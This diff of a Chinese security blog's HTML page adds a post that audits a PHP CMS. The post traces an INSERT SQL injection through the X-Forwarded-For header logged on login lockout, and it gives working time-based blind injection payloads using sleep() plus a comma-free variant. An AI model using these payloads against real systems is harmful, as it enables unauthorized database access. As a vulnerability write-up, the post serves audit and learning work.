@@ -163,12 +163,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
@@ -212,6 +212,109 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/ckrie.jpg">
+      <meta itemprop="name" content="热爱篮球和安全的小伙子">
+      <meta itemprop="description" content="记录我的学习之旅">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hungry and humble">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">审计某cms到insert注入技巧</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-03-12 19:28:02 / Modified: 21:21:40" itemprop="dateCreated datePublished" datetime="2021-03-12T19:28:02+08:00">2021-03-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">PHP代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="记一次审计实战以及insert注入技巧"><a href="#记一次审计实战以及insert注入技巧" class="headerlink" title="记一次审计实战以及insert注入技巧"></a>记一次审计实战以及insert注入技巧</h1><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>这是做项目碰到的一个cms，根据特征发现github上有源码，下载进行审计。后台长这样</p>
+<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1.png" alt="1"></p>
+<p>该漏洞成因是因为后台登陆某个存在的账户过多时会进行锁定，并将此记录到数据库中。<br><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/2.png" alt="2"></p>
+<p>当锁定用户时会进入记录IP并进入logHandler类的initAndWriteLog方法，部分实现代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initAndWriteLog</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$msg</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$internalKey</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$username</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$action</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$itemid</span> = <span class="string">&quot;&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="variable">$itemname</span> = <span class="string">&quot;&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params"> </span>) </span>&#123;</span><br><span class="line">     <span class="variable">$modx</span> = evolutionCMS();</span><br><span class="line">     ........</span><br><span class="line">     <span class="keyword">$this</span>-&gt;writeToLog();</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>然后会调用writeToLog方法写入日志：</p>
+<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/3.png" alt="3"></p>
+<p>定义$fields数组最后插入到数据库中，后面的代码应该就是遍历数组插入数据库。继续跟进getuserip的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( array_key_exists(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>, <span class="variable">$_SERVER</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>], <span class="string">&#x27;,&#x27;</span>)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">            <span class="keyword">return</span> trim(<span class="variable">$addr</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里获取X_FORWARDED_FOR的值并返回，注意这里会将逗号分隔，其他的没有什么限制，所以注入的话就不能用逗号。</p>
+<p>为了方便，我根据代码实现一个类似的简单功能：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="string">&quot;我们的payload&quot;</span>;</span><br><span class="line">    <span class="variable">$addr</span> = explode(<span class="string">&quot;,&quot;</span>,<span class="variable">$ip</span>);</span><br><span class="line">    <span class="variable">$fields</span>[<span class="string">&#x27;message&#x27;</span>] = <span class="string">&#x27;asdgas&#x27;</span>;</span><br><span class="line">    <span class="variable">$fields</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$addr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$fields</span>[<span class="string">&#x27;useragent&#x27;</span>] = <span class="string">&#x27;asdgasdg&#x27;</span>;</span><br><span class="line">    <span class="variable">$fields</span> = <span class="string">&quot;(`&quot;</span> . implode(<span class="string">&quot;`, `&quot;</span>, array_keys(<span class="variable">$fields</span>)) . <span class="string">&quot;`) VALUES(&#x27;&quot;</span> .  implode(<span class="string">&quot;&#x27;, &#x27;&quot;</span>,array_values(<span class="variable">$fields</span>)) . <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">    var_dump(<span class="variable">$fields</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后将$fields插入代码中执行insert语句,最后成功延时。<br><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/4.png" alt="4"></p>
+<h2 id="insert注入脱坑"><a href="#insert注入脱坑" class="headerlink" title="insert注入脱坑"></a>insert注入脱坑</h2><p>这里报错注入是用不了的，只能是时间盲注加不使用逗号，其实常规注入就可以，只是本地测试发现一些小问题记录一下。</p>
+<ul>
+<li>逗号能使用的情况</li>
+</ul>
+<p>利用substr函数构造if语句即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)&#x3D;&#39;p&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into admin values (2,&#39;&#39;+if((substr((select user()),1,1)&#x3D;&#39;r&#39;),sleep(5),1)+&#39;&#39;,&quot;admin&quot;);</span><br><span class="line">Query OK, 1 row affected (5.01 sec)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>不能使用逗号的情况</li>
+</ul>
+<p>先给出三个语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into test values (&quot;adn&quot;,&#39;1&#39; (select case when substr((select user()) from 1 for 1)&#x3D;&#39;r&#39; then sleep(5) else 0 end) &#39;1&#39;,&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">insert into test values (&quot;adn&quot;,&#39;1&#39;+(select case when substr((select user()) from 1 for 1)&#x3D;&#39;r&#39; then sleep(5) else 0 end)+&#39;1&#39;,&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">insert into test values (&quot;adn&quot;,&#39;1&#39; and (select case when substr((select user()) from 1 for 1)&#x3D;&#39;r&#39; then sleep(5) else 0 end) and &#39;1&#39;,&quot;admin&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第一个语句肯定是会报错的，原理说不上来。<br>来看第二第三个语句，前者是运算符拼接，后者是and连接，并且插入的数据也不一样，前提是能执行成功如果执行结果为0是不会插入数据库的。</p>
+<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/5.png" alt="5"></p>
+<p>但是发现一个问题：</p>
+<p><img src="/2021/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/6.png" alt="6"></p>
+<p>反正没琢磨明白。。。。。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="https://little-gu.github.io/2021/03/04/mssql%E6%B3%A8%E5%85%A5getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -236,9 +339,24 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2021-03-04 21:01:57 / Modified: 21:26:17" itemprop="dateCreated datePublished" datetime="2021-03-04T21:01:57+08:00">2021-03-04</time>
+      <time title="Created: 2021-03-04 21:01:57" itemprop="dateCreated datePublished" datetime="2021-03-04T21:01:57+08:00">2021-03-04</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-03-12 19:29:36" itemprop="dateModified" datetime="2021-03-12T19:29:36+08:00">2021-03-12</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
     </span>
 
   
